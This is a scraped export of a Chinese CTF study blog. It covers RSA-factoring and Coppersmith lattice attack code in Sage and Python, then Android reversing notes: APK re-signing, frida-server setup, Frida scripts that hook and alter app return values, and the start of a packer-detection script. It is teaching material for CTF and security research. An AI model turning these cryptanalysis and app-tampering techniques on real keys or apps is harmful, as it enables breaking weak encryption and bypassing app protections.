$(x^2-n)$ 可被完全开方，即 $x^2-n=y^2$ 时，即求出 $(x,y)$。 12345678910111213141516import gmpy2from Crypto.Util.number import *def factor(n): a = gmpy2.iroot(n, 2)[0] while 1: B2 = pow(a, 2) - n if gmpy2.is_square(B2): b = gmpy2.iroot(B2, 2)[0] p = a + b q = a - b return p, q a += 1 n = print(factor(n)) 1234567891011121314151617181920212223from gmpy2 import *def fermat_factorization(n): factor_list = [] get_context().precision = 2048 x = int(sqrt(n)) print(x) while True: x += 1 y2 = x ** 2 - n if is_square(y2): print(&#x27;x = &#x27;,x) y2 = mpz(y2) get_context().precision = 2048 y = int(sqrt(y2)) factor_list.append([x+y, x-y]) if len(factor_list) == 2: break return factor_listn = print(fermat_factorization(n)) ​ 高斯整数高斯整数 $\\mathbb{Z}[i]=\\{a+bi \\mid a,b \\in \\mathbb{Z}\\}$​。 对于 $z=x^2+y^2=(x+yi)(x-yi)=(y+xi)(y-xi)$​，且满足 $z=(a_1+b_1i)^t(a_1-b_1i)^t \\cdots (a_k+b_ki)^t(a_k-b_ki)^t$，可用于分解 $z$ 求得 $x,y$。 1234z = GI = GaussianIntegers()GI(z).factor()#因子组合 1234567N = zn = ZZ[i](N)for d in divisors(zn): pp, qq = map(int, d) if is_prime(pp) and is_prime(qq): p = pp q = qq ​ CopperSmith攻击算法描述： 假设 $N$ 是一个未知因子组成的数，且存在一个因子 $b \\ge N^{\\beta},(0 \\lt \\beta \\le 1)$，$f(x)$ 是一个一元一次 $d$ 阶的多项式，且 $c \\ge 1$，那么可以在 $\\text{O}(cd^5\\log^9(N))$ 的复杂度内求解所有的 $x_0$。 $f(x_0) \\equiv 0 \\pmod b, x_0 \\le cN^{\\frac{\\beta^2}{d}}$ Coppersmith攻击与Don Coppersmith紧密相关，他提出了一种针对于模多项式（单变量，二元变量，甚至多元变量）找所有小整数根的多项式时间的方法。我们的目标是找到在模 $N$ 意义下多项式所有的根，这一问题被认为是复杂的，即满足下式的根： $F(x)=x^n+a_{n-1} x^{n-1}+ ···+ a_1 x+a_0 \\equiv 0 \\pmod N$ Coppersmith method 主要是通过 Lenstra–Lenstra–Lovász lattice basis reduction algorithm（LLL）方法。 Coppersmith攻击可解根上界：$N^{\\frac{\\beta^2}{d}-\\epsilon}$。 $d$ 为待求解多项式的阶，$\\beta$ 为有限域 $\\mathbb{Z}(p)$ 上多项式中 $p$ 满足 $p&gt;N^{\\beta}$，$\\epsilon$ 是调节参数。 参数的选取问题： $p\\geq N^{\\beta}$，因为$p\\cdot q = N,p\\neq q$，$\\beta$的取值可以略小于$\\frac{1}{2}$，例如$0.49$。 小根$x_0$的上界$X$，选取$X=2^{K}$，$K$ 为未知位数。 $\\varepsilon$的取值，可以选取$\\epsilon=\\frac{\\beta^2}{\\delta}-\\log_{N}(2\\cdot X)$。实际上，可以略微将$\\epsilon$的值提升一点，可以有效降低时间开销。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#Sage### 单元PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (a + x)^e - croot = f.small_roots(X=2^256, beta=1)[0] # find root &lt; 2^256 with factor = n#调参，增大格#beta=0.48, epsilon=0.02### 多元1import itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []PR.&lt;a, b&gt; = PolynomialRing(Zmod(n))f = 4*r^2*a*b + 2*r*(a+b) + 1 - nroots = small_roots(f, (2^256, 2^256), m=3)a, b = roots[0]PR.&lt;x, y&gt; = PolynomialRing(Zmod(q)) # n = x*y# PR.&lt;x, y&gt; = Polygen(RealField(1000)) # n ≈ x*yf = (2^256 * a + x) * s - (2^256 + 1) * y * b - croots = small_roots(f, [2^256, 2^256], m=4, d=4)### 多元2（二元）def bivariate(pol, XX, YY, kk=3): N = pol.parent().characteristic() f = pol.change_ring(ZZ) PR,(x,y) = f.parent().objgens() idx = [ (k-i, i) for k in range(kk+1) for i in range(k+1) ] monomials = list(map(lambda t: PR( x**t[0]*y**t[1] ), idx)) # collect the shift-polynomials g = [] for h,i in idx: if h == 0: g.append( y**h * x**i * N ) else: g.append( y**(h-1) * x**i * f ) # construct lattice basis M = Matrix(ZZ, len(g)) for row in range( M.nrows() ): for col in range( M.ncols() ): h,i = idx[col] M[row,col] = g[row][h,i] * XX**h * YY**i # LLL B = M.LLL() PX = PolynomialRing(ZZ, &#x27;xs&#x27;) xs = PX.gen() PY = PolynomialRing(ZZ, &#x27;ys&#x27;) ys = PY.gen() # Transform LLL-reduced vectors to polynomials H = [ ( i, PR(0) ) for i in range( B.nrows() ) ] H = dict(H) for i in range( B.nrows() ): for j in range( B.ncols() ): H[i] += PR( (monomials[j]*B[i,j]) / monomials[j](XX, YY) ) # Find the root poly1 = H[0].resultant(H[1], y).subs(x=xs) poly2 = H[0].resultant(H[2], y).subs(x=xs) poly = gcd(poly1, poly2) x_root = poly.roots()[0][0] poly1 = H[0].resultant(H[1], x).subs(y=ys) poly2 = H[0].resultant(H[2], x).subs(y=ys) poly = gcd(poly1, poly2) y_root = poly.roots()[0][0] return x_root, y_rootPR.&lt;x,y&gt; = PolynomialRing(Zmod(N))f = (x*2**923)+p0+yx, y = bivariate(f, 2^101, 2^101)### 其他多元load(&#x27;coppersmith.sage&#x27;)P.&lt;x, y&gt; = PolynomialRing(GF(p))f = 2^170 * a^2 + 2^86 * a * x + x^2 - 2^85 * b + c - yroots = coron(f, X=2^85, Y=2^85, k=1, debug=True)### flatter加速from re import findallfrom subprocess import check_outputdef flatter(M): # compile https://github.com/keeganryan/flatter and put it in $PATH z = &quot;[[&quot; + &quot;]\\n[&quot;.join(&quot; &quot;.join(map(str, row)) for row in M) + &quot;]]&quot; ret = check_output([&quot;flatter&quot;], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int, findall(b&quot;-?\\\\d+&quot;, ret)))def small_roots(self, X=None, beta=1.0, epsilon=None, **kwds): from sage.misc.verbose import verbose from sage.matrix.constructor import Matrix from sage.rings.real_mpfr import RR N = self.parent().characteristic() if not self.is_monic(): raise ArithmeticError(&quot;Polynomial must be monic.&quot;) beta = RR(beta) if beta &lt;= 0.0 or beta &gt; 1.0: raise ValueError(&quot;0.0 &lt; beta &lt;= 1.0 not satisfied.&quot;) f = self.change_ring(ZZ) P, (x,) = f.parent().objgens() delta = f.degree() if epsilon is None: epsilon = beta / 8 verbose(&quot;epsilon = %f&quot; % epsilon, level=2) m = max(beta**2 / (delta * epsilon), 7 * beta / delta).ceil() verbose(&quot;m = %d&quot; % m, level=2) t = int((delta * m * (1 / beta - 1)).floor()) verbose(&quot;t = %d&quot; % t, level=2) if X is None: X = (0.5 * N ** (beta**2 / delta - epsilon)).ceil() verbose(&quot;X = %s&quot; % X, level=2) # we could do this much faster, but this is a cheap step # compared to LLL g = [x**j * N ** (m - i) * f**i for i in range(m) for j in range(delta)] g.extend([x**i * f**m for i in range(t)]) # h B = Matrix(ZZ, len(g), delta * m + max(delta, t)) for i in range(B.nrows()): for j in range(g[i].degree() + 1): B[i, j] = g[i][j] * X**j B = flatter(B) f = sum([ZZ(B[0, i] // X**i) * x**i for i in range(B.ncols())]) R = f.roots() ZmodN = self.base_ring() roots = set([ZmodN(r) for r, m in R if abs(r) &lt;= X]) Nbeta = N**beta return [root for root in roots if N.gcd(ZZ(self(root))) &gt;= Nbeta]PR.&lt;x&gt; = PolynomialRing(Zmod(N))f = x^2 - crs = small_roots(f, X=2^256, beta=0.499, epsilon=0.01) ​ Gröbner基空间和域 理想 $F=\\{f_1,\\cdots,f_k\\}$ 是一个多项式集合，其生成的理想为集合元素的线性组合，组合系数也是多项式 $\\langle f_1,\\cdots,f_k \\rangle=\\biggl\\{ \\sum\\limits_{i=1}^k g_if_i \\vert g_1,\\cdots,g_k \\in K[x_1,\\cdots,x_n] \\biggr\\}$， 其中 $R=K[x_1,\\cdots,x_n]$ 是在域 $K$ 上的多项式环。 环 $R$ 的一个非空子集 $I$ ，如果对于 $R$ 的两个代数运算，满足条件：对任意 $a,b \\in I,r \\in R$，有 $a-b \\in I,ra \\in I$，则称 $I$ 是环 $R$ 的一个左理想。 环 $R$ 的一个非空子集 $I$ ，如果对于 $R$ 的两个代数运算，满足条件：对任意 $a,b \\in I,r \\in R$，有 $a-b \\in I,ar \\in I$，则称 $I$ 是环 $R$ 的一个右理想。 环 $R$ 的一个非空子集 $I$ ，如果既是左理想又是右理想，称 $I$ 为 $R$ 的双边理想，通常简称 $I$ 为 $R$ 的理想。 根据以下定理，每个理想都有一个生成集： Hilbert 基定理： 每个多项式理想 $I \\subseteq K[x_1,\\cdots,x_n]$ 都有一个有限生成集，即存在 $g_1,\\cdots,g_t \\in I$，使得 $I=\\langle g_1,\\cdots,g_t \\rangle$。 Gröbner基定义 对于单项式序下的多项式环 $K[x_1,\\cdots,x_n]$，理想 $I \\subseteq K[x_1,\\cdots,x_n]$ 的非 $\\{0\\}$ 且满足 $\\langle \\mathrm{LT}(g_1),\\cdots,\\mathrm{LT}(g_t) \\rangle=\\langle \\mathrm{LT}(I) \\rangle$ 的有限生成集 $G=\\{g_1,\\cdots,g_t\\}$，称为Gröbner基。定义 $\\{0\\}$ 的Gröbner基为空集 $\\varnothing$。 Gröbner基的两个应用，判断一个多项式是否属于当前的Gröbner基生成的理想 （即Ideal Membership problem），另一个应用就是解方程组。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#Sage###ZZ/QQ/RR#Example-1P.&lt;x, y&gt; = PolynomialRing(QQ)f1 = x^2 + x*y - 10f2 = x^3 + x^2*y - 20f3 = x^4 + x*y^3 - 70G = Ideal([f1, f2, f3]).groebner_basis()print(G)#Example-2PR = PolynomialRing(Zmod(N), &#x27;x&#x27;, len(Cs))x = PR.gens()f1 = (65537*x[0] - 66666*x[1] + 12345*x[2] - x[3])f2 = x[0] + x[1] + x[2] - sFs = [f1, f2]Fs.extend([(x[i]**e - Cs[i]) for i in range(l)])I = Ideal(Fs)B = I.groebner_basis()print(B)m = &#x27;&#x27;for b in B: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0, 0)) print(mi)###Zmod(p)from sage.matrix.matrix2 import Matrix def resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))P.&lt;Rx, Ry, Qx, Qy&gt; = PolynomialRing(Zmod(p))f1 = Ry^2 - Rx^3 - a*Rx - bf2 = Qy^2 - Qx^3 - a*Qx - bf3 = (Qy + Ry)^2 + (Qx - Rx)^2 * (- Rx - Qx - Px)f4 = (- Qy - Ry) * (Rx - Px) + (Qx - Rx) * (- Ry - Py)f5 = Rx * Qx - NG = Ideal([f1, f2, f3, f4, f5]).groebner_basis()#结式+矩阵子式（西尔维斯特矩阵）print(&#x27;[!] computing resultant h1...&#x27;)h1 = resultant(G[0], G[1], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h2...&#x27;)h2 = resultant(G[0], G[2], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h3...&#x27;)h3 = resultant(G[3], G[4], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h4...&#x27;)h4 = resultant(G[3], G[5], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h5...&#x27;)h5 = resultant(h1, h2, Ry) # Qx, Qyprint(&#x27;[!] computing resultant h6...&#x27;)h6 = resultant(h3, h4, Ry) # Qx, Qyprint(&#x27;[!] computing resultant h7...&#x27;)h7 = resultant(h5, h6, Qy) # Qxprint(&#x27;[!] computing resultant h8...&#x27;)h8 = resultant(h7, f5, Qx) # Rxroots = h8.univariate_polynomial().roots()p, q = [ZZ(t[0]) for t in roots if ZZ(t[0]).is_prime()] ​ Diffie-Hellman密钥交换（DH密钥交换 / DHKE）Diffie-Hellman密钥交换（DHKE）是由Whitfield Diffie和Martin Hellman在1976年提出的。密钥交换方案提供了实际中密钥分配问题的解决方案，即允许双方通过不安全的信道进行交流获得一个共同密钥。许多公开和商业密码协议中都实现了这种基本的密钥协议技术。 基于乘法群： A和B协商一个有限循环群 $G$ 和它的一个生成元 $g$，一个大素数 $p$； A生成一个随机数 $a$，计算 $A=g^a \\pmod p$，将 $A$ 发送给B； B生成一个随机数 $b$，计算 $B=g^b \\pmod p$，将 $B$ 发送给A； A计算 $K=B^a \\pmod p=(g^b)^a \\pmod p$，得到共享密钥 $K$； B计算 $K=A^b \\pmod p=(g^a)^b \\pmod p$，得到共享密钥 $K$。 基于加法群： A和B协商一个有限循环群 $G$ 和它的一个生成元 $g$，一个大素数 $p$； A生成一个随机数 $a$，计算 $A=ag \\pmod p$，将 $A$ 发送给B； B生成一个随机数 $b$，计算 $B=bg \\pmod p$，将 $B$ 发送给A； A计算 $K=aB \\pmod p=a(bg) \\pmod p$，得到共享密钥 $K$； B计算 $K=bA \\pmod p=b(ag) \\pmod p$，得到共享密钥 $K$。 ​ 矩阵快速幂根据斐波那契的递推公式： $\\left\\{\\begin{array}{cl} f(n)&amp;=&amp;f(n-1)+f(n-2) \\\\ f(n-1)&amp;=&amp;f(n-1) \\end{array}\\right. \\Rightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\end{bmatrix}$ 设 $\\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=F(n)$，则 $F(n)=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix} \\cdot F(n-1)$ 把矩阵当成一个常数来看，即类似等比数列递推公式，即： $\\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix}^{n-1}\\begin{bmatrix} f(1) \\\\ f(0) \\end{bmatrix}$ 所以最终转换成一个求解矩阵幂运算的通项公式。 普通快速幂算法： 12345678910int qpow(int x, int n, int m) &#123; int res = 1; while (n) &#123; if (n &amp; 1) res = res * x % m; x = x * x % m; n &gt;&gt;= 1; &#125; return res;&#125; 根据矩阵乘法运算改写为矩阵快速幂： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;iostream&gt;using namespace std;#define N 2struct matrix &#123; int m[N][N]; matrix() &#123; memset(m, 0, sizeof(m)); &#125; void prt();&#125;;void matrix::prt() &#123; for (int i = 0; i &lt; N; ++ i) &#123; for (int j = 0; j &lt; N; ++ j) &#123; cout &lt;&lt; this -&gt; m[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125;&#125;matrix operator * (const matrix a, const matrix b) &#123; matrix ans; for (int i = 0; i &lt; N; ++ i) &#123; for (int j = 0; j &lt; N; ++ j) &#123; for(int k = 0; k &lt; N; ++ k) &#123; ans.m[i][j] += a.m[i][k] * b.m[k][j]; &#125; &#125; &#125; return ans;&#125;matrix qpow(matrix x, int n) &#123; matrix res; for (int i = 0; i &lt; N; ++ i) &#123; res.m[i][i] = 1; &#125; while (n) &#123; if (n &amp; 1) res = res * x; x = x * x; n &gt;&gt;= 1; &#125; return res;&#125;int fib(int n) &#123; matrix a; a.m[0][0] = a.m[1][0] = a.m[0][1] = 1; matrix base; base.m[0][0] = 1; matrix ans = qpow(a, n - 1); ans = ans * base; return ans.m[0][0];&#125;int main() &#123; cout &lt;&lt; fib(1) &lt;&lt; endl; // 1 cout &lt;&lt; fib(2) &lt;&lt; endl; // 1 cout &lt;&lt; fib(3) &lt;&lt; endl; // 2 cout &lt;&lt; fib(4) &lt;&lt; endl; // 3 cout &lt;&lt; fib(5) &lt;&lt; endl; // 5 cout &lt;&lt; fib(6) &lt;&lt; endl; // 8 cout &lt;&lt; fib(7) &lt;&lt; endl; // 13&#125; 其他递推关系 $f(n)=af(n-1)+bf(n-2)\\Longrightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} a &amp; b \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\end{bmatrix}$ $f(n)=af(n-1)+bf(n-2)+c \\Longrightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\\\ c \\end{bmatrix}=\\begin{bmatrix} a &amp; b &amp; 1 \\\\ 1 &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\\\ c\\end{bmatrix}$ $f(n)=ac^n+bf(n-1)+d \\Longrightarrow \\begin{bmatrix} f(n) \\\\ c^n \\\\ d \\end{bmatrix}=\\begin{bmatrix} b &amp; ac &amp; 1 \\\\ 0 &amp; c &amp; 0 \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ c^{n-1} \\\\ d\\end{bmatrix}$ $S(n)=A \\cdot S(n-1)+A\\Longrightarrow \\begin{bmatrix} S(n) \\\\ A \\end{bmatrix}=\\begin{bmatrix} A &amp; E \\\\ 0 &amp; E \\end{bmatrix}\\begin{bmatrix} S(n-1) \\\\ A \\end{bmatrix}$ 123456789101112131415161718192021222324#以2x2矩阵相乘为例m = [[1 for i in range(2)]for j in range(2)]m[1][1] = 0n = int(input())def mulMatrix(x,y): #定义二阶矩阵相乘的函数 ans = [[0 for i in range(2)]for j in range(2)] for i in range(2): for j in range(2): for k in range(2): ans[i][j] += x[i][k] * y[k][j] return ansdef quickMatrix(m,n): E = [[0 for i in range(2)]for j in range(2)] #先定义一个单位矩阵 for i in range(2): E[i][i] = 1 while(n): if n % 2 != 0: E = mulMatrix(E,m) m = mulMatrix(m,m) n &gt;&gt;= 1 return Eprint(quickMatrix(m,n)) ​ 佩尔方程 / Pell方程若一个不定方程具有形式： $x^2-ny^2=1$ 则称此二元二次不定方程为佩尔方程。 若 $n$ 是完全平方数，则这个方程式只有平凡解。对于其余情况，拉格朗日证明了佩尔方程总有非平凡解。而这些解可由 $\\sqrt{n}$ 的连分数求出。 设 $\\frac{p}{q}$ 是 $\\sqrt{n}$ 的连分数表示：$[a_0;a_1,a_2,a_3,\\cdots]$ 的渐进分数列，由连分数理论知存在 $i$ 使得 $(p_i,q_i)$ 为佩尔方程的解。取其中最小的 $i$，将对应的 $(p_i,q_i)$ 称为佩尔方程的基本解（最小解），记作 $(x_1,y_1)$，则所有的解 $(x_i,y_i)$ 可表示成如下形式： $x_i+y_i\\sqrt{n}=(x_1+y_1\\sqrt{n})^i$ 或者由以下的递推式得到： $x_{i+1} = x_1x_i+ny_1y_i$ $y_{i+1} = x_1y_i+y_1x_i$ 1234567891011def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, NoneN = solve_pell(N)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"}],"author":"Lazzaro"},{"title":"Android逆向","slug":"reverse-Android逆向","date":"2020-05-10T09:52:00.000Z","updated":"2025-05-13T14:32:47.552Z","comments":true,"path":"2020/05/10/reverse-Android逆向/","permalink":"https://lazzzaro.github.io/2020/05/10/reverse-Android%E9%80%86%E5%90%91/","excerpt":"","text":"​ 动态调试Java层动调在Manifest给 AndroidManifest.xml 设置： android:debuggable=&quot;true&quot; 使用apktool工具解包修改manifest，重打包回去之后进行签名； 先对文件进行对齐： zipalign -p -f -v 4 input.apk output_unsigned.apk 加签名，其中 abc.keystore 是通过 androidstudio 生成的签名文件，也可以自行用工具生成，参考：APK反编译、重打包、签名之apktool实现_apktool反编译还是乱码-CSDN博客： apksigner sign --ks abc.keystore output_unsigned.apk 安装到手机上，以调试模式启动： adb shell am start -D -n com.chick.androdbgme/.MainActivity 用jeb attach上去，运行修改后代码。 ​ Native层调试参考： IDA以Debug模式启动APK调试SO的JNI_OnLoad函数的两种办法 ​ FridaFrida是一款基于Python + JavaScript 的hook框架，本质是一种动态插桩技术。可以用于Android、Windows、iOS等各大平台，其执行脚本基于Python或者Node.js写成，而注入代码用JavaScript写成。 原理frida使用的是动态二进制插桩技术（DBI）。 插桩技术是指将额外的代码注入程序中以收集运行时的信息，可分为两种： 源代码插桩 (Source Code Instrumentation, SCI)：顾名思义，在程序源代码的基础上增加（注入）额外的代码，从而达到预期目的或者功能； 二进制插桩 (Binary Instrumentation)：额外代码注入到二进制可执行文件中，通过修改汇编地址，改变程序运行内容，运行后再返回到原来程序运行出处，从而实现程序的额外功能。 静态二进制插桩 (Static Binary Instrumentation, SBI)：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。 动态二进制插桩 (Dynamic Binary Instrumentation, DBI)：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。 DBI能做什么？ 访问进程的内存 在应用程序运行时覆盖一些功能 从导入的类中调用函数 在堆上查找对象实例并使用这些对象实例 Hook，跟踪和拦截函数等等 安装安装frida包 12pip install frida -i https://pypi.mirrors.ustc.edu.cn/simple/ pip install frida-tools -i https://pypi.mirrors.ustc.edu.cn/simple/ 配置代码提示 安装node.js后，新建文件夹，在目录下执行命令： 1npm i @types/frida-gum 配置成功，可以在当前目录下编写js代码。 Server环境配置 Releases · frida/frida (github.com) 下载Frida的Server端-&gt;frida-server-15.1.4-android-arm64.xz，这里版本要与hook程序架构适配。 然后push到手机的data/local/tmp目录下，和IDA的动态调试有点类似。 12345678910111213141516171819202122# 查看设备实际 CPU ABI，用于下载对应的frida-server-x.x.x-android-xxx.xzadb shell getprop ro.product.cpu.abiadb devices # 查看端口adb.exe connect 127.0.0.1:62026adb push .\\frida-server-16.0.11-android-x86_64/data/local/tmp/fridaadb shellsucd /data/local/tmp/frida# 然后修改权限chmod 777 frida-server-16.0.11-android-x86_64# 直接运行frida服务./frida-server-16.0.11-android-x86_64# 开启端口转发,转发android TCP端口到本地adb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043 如果能显示进程列表说明环境搭建完成： 12# PC端输入frida-ps -R Frida Hook执行Hook启动时hook： 12# 将 xxxxxx 换成你手机里安装好的任意apk包名frida -U -f com.test.apk -l test.js 启动apk后hook： 12frida -U -f com.test.apk%load test.js Java层HookFrida的Java层重要函数 使用 java平台—&gt;Java.perform(function () &#123;&#125; 获取 Java类 —&gt;Java.use(className)。 当获取到Java类之后，直接通过 &lt;wrapper&gt;.&lt;method&gt;.implementations = function() &#123;&#125; 的方式来hook wrapper类的method方法，不管是实例方法还是静态方法都可以。 Hook普通方法被Hook的代码： 12345678package com.example.xxx;public class Student &#123; static public int Add(int a,int b) &#123; return a+b; &#125;&#125; Hook代码： 1234567891011121314151617181920212223function main()&#123; //使用java平台 Java.perform( function() &#123; //获取java类 var student=Java.use(&quot;com.example.xxx.Student&quot;); //hook Add方法(重写Add方法) student.Add.implementation=function(a,b) &#123; //修改参数 a=123; b=456; //调用原来的函数 var res = this.Add(a,b); //输出结果 console.log(a,b,res); return res; &#125; &#125; );&#125;setImmediate(main) Hook执行so函数Hook有导出函数通过导出函数名称找到函数地址即可进行hook： 1234567891011121314151617181920212223242526272829303132333435// # com.xfast.hgr:bgfunction main()&#123; Java.perform(function () &#123; var JavaString = Java.use(&quot;java.lang.String&quot;); var adk_addr = Module.findExportByName(&quot;libnativelib.so&quot;,&quot;Java_com_faster_nativelib_NativeLib_adk&quot;); console.log(&quot;[*] 目标hook函数的内存地址是: &quot; + adk_addr); //var aes_128 = new NativeFunction(aes_addr , &#x27;pointer&#x27;, [&#x27;pointer&#x27;, &#x27;pointer&#x27;]); // 返回值，参数 Interceptor.attach(adk_addr,&#123; //在hook函数之前执行的语句 onEnter: function(args) &#123; console.log(&quot;[*] Success Hook So!&quot;); &#125;, //在hook函数之后执行的语句 onLeave:function(retval) &#123; console.log(&quot;[*] 原始的So层函数返回值是：&quot;+ Java.vm.getEnv().getStringUtfChars(retval,null).readCString()); // var change=1; // retval.replace(change); // console.log(&quot;[*] 篡改的So层函数返回值是：&quot;+retval); &#125; &#125;); &#125;);&#125; // frida print String 类型返回值 // //方式一 // var element = Java.cast(obj,Java.use(&quot;java.lang.String&quot;)); // //方式二 // var element = Java.vm.getEnv().getStringUtfChars(obj,null).readCString(); setImmediate(main) 执行后成功hook函数返回值： 123456// 配置好环境frida -UF com.xfast.hgr -l test.js或者frida -UF com.xfast.hgr%load test.js Hook无导出函数.so 文件被去符号，无法找到对应函数名称，通过偏移地址调用函数： 1234567891011121314151617181920212223242526function hookTest9()&#123; //so名称 var so_name=&quot;libnative-lib.so&quot;; //要Hook的函数偏移 var fun_off=0x7078; //加载到内存后，函数地址=so地址+函数偏移 var so_add=Module.findBaseAddress(so_name); var add_func=parseInt(so_add,16)+fun_off; var ptr_fun=new NativePointer(add_func); Interceptor.attach(ptr_fun,&#123; //在hook函数之前执行 onEnter:function(args) &#123; console.log(&quot;hook enter&quot;); &#125;, //在hook函数之后执行 onLeave:function(retval) &#123; console.log(&quot;hook leaver&quot;); &#125; &#125;); &#125; 示例123456789101112131415161718192021222324function main()&#123; Java.perform( function() &#123; var b=Java.use(&quot;com.example.mobile01.b&quot;); b.c.implementation=function() &#123; return &#x27;D2eFgHiJkLmNoPqR&#x27;; &#125; var des=Java.use(&quot;com.example.mobile01.DESHelper&quot;); des.encrypt.implementation=function(str,str2,str3) &#123; console.log(str); console.log(str2); console.log(str3); var res=this.encrypt(str,str2,str3); console.log(res); return res; &#125; &#125; );&#125;setImmediate(main) 12345678910111213141516171819202122function main()&#123; Java.perform(function()&#123; Java.choose(&quot;com.dionysus.ez_android.MainActivity&quot;, &#123; onMatch(instance) &#123; let G = instance.G.value; let maze_str = Java.use(&quot;java.lang.String&quot;).$new(G); console.warn(maze_str); &#125;, onComplete() &#123; console.log(&quot;Search complete.&quot;); &#125; &#125;) &#125;)&#125;setImmediate(main); ​ 脱壳apk壳检测12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import zipfile&#x27;&#x27;&#x27;first,get namelist from apksecond,matching the featuresthrid,julging for the shellTypeso easy~~by zsdlove2018/8/24 Morning&#x27;&#x27;&#x27;shellfeatures=&#123; &quot;libchaosvmp.so&quot;:&quot;娜迦&quot;, &quot;libddog.so&quot;:&quot;娜迦&quot;, &quot;libfdog.so&quot;:&quot;娜迦&quot;, &quot;libedog.so&quot;:&quot;娜迦企业版&quot;, &quot;libexec.so&quot;:&quot;爱加密&quot;, &quot;libexecmain.so&quot;:&quot;爱加密&quot;, &quot;ijiami.dat&quot;:&quot;爱加密&quot;, &quot;ijiami.ajm&quot;:&quot;爱加密企业版&quot;, &quot;libsecexe.so&quot;:&quot;梆梆免费版&quot;, &quot;libsecmain.so&quot;:&quot;梆梆免费版&quot;, &quot;libSecShell.so&quot;:&quot;梆梆免费版&quot;, &quot;libDexHelper.so&quot;:&quot;梆梆企业版&quot;, &quot;libDexHelper-x86.so&quot;:&quot;梆梆企业版&quot;, &quot;libprotectClass.so&quot;:&quot;360&quot;, &quot;libjiagu.so&quot;:&quot;360&quot;, &quot;libjiagu_art.so&quot;:&quot;360&quot;, &quot;libjiagu_x86.so&quot;:&quot;360&quot;, &quot;libegis.so&quot;:&quot;通付盾&quot;, &quot;libNSaferOnly.so&quot;:&quot;通付盾&quot;, &quot;libnqshield.so&quot;:&quot;网秦&quot;, &quot;libbaiduprotect.so&quot;:&quot;百度&quot;, &quot;aliprotect.dat&quot;:&quot;阿里聚安全&quot;, &quot;libsgmain.so&quot;:&quot;阿里聚安全&quot;, &quot;libsgsecuritybody.so&quot;:&quot;阿里聚安全&quot;, &quot;libmobisec.so&quot;:&quot;阿里聚安全&quot;, &quot;libtup.so&quot;:&quot;腾讯&quot;, &quot;libexec.so&quot;:&quot;腾讯&quot;, &quot;libshell.so&quot;:&quot;腾讯&quot;, &quot;mix.dex&quot;:&quot;腾讯&quot;, &quot;lib/armeabi/mix.dex&quot;:&quot;腾讯&quot;, &quot;lib/armeabi/mixz.dex&quot;:&quot;腾讯&quot;, &quot;libtosprotection.armeabi.so&quot;:&quot;腾讯御安全&quot;, &quot;libtosprotection.armeabi-v7a.so&quot;:&quot;腾讯御安全&quot;, &quot;libtosprotection.x86.so&quot;:&quot;腾讯御安全&quot;, &quot;libnesec.so&quot;:&quot;网易易盾&quot;, &quot;libAPKProtect.so&quot;:&quot;APKProtect&quot;, &quot;libkwscmm.so&quot;:&quot;几维安全&quot;, &quot;libkwscr.so&quot;:&quot;几维安全&quot;, &quot;libkwslinker.so&quot;:&quot;几维安全&quot;, 